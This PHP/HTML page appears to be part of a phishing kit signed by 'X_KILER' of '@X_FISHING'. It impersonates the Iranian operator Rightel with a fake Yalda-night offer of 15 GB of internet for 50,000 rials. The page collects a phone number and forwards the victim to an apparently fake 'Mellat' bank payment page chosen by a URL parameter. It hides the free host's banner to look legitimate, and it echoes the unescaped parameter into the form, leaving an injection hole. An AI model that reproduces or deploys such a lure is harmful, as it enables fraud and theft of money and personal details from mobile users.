
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>

<!DOCTYPE html>
<html xmlns="https://www.w3.org/1999/xhtml">
<head>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
  <link href="css/rightel.css" rel="stylesheet"/>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
  <style>img[alt="www.000webhost.com"]{display:none;}</style>
<title>هدیه بزرگ رایتل به مشتریان</title>
<meta name="viewport" content="width=device-width">
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
</head>
<body>
<div class="border">
    <img src="img/right.jpg" style="width:265px; height:200px; margin:auto;"></img>
<p class="title" style="">15گیگ اینترنت رایتلی بدون تعرفه ی پیامکی</p>
<p class="text">به مناسبت رسیدن شب یلدا طولانی ترین شب ایران شرکت رایتل و دیگر شبکه های مخابراطی در صدد ان شدن که ذلغ ترین پیشنهاد ویژه رو در اختیار کاربران بزارند.شما با پرداخت تنها50000ريال معادل پنج هزارتومان مشمول به دریافت 15گیگ اینترنت خواهید شد.لطفا برای وصل شدن به سیستم شماره تلفن رایتلتان را وارد کنید
</p>
<br/>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
<form method="POST" action="../<?php echo $P?>/?e=<?php echo $e?>&amount=50,000">
  <input type="text" class="textbox" required placeholder="شماره تلفن خود را وارد نمایید" />
  <br/>
  <input type="submit" value="ارسال" class="btn"/>
</form>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
</div>
</html>
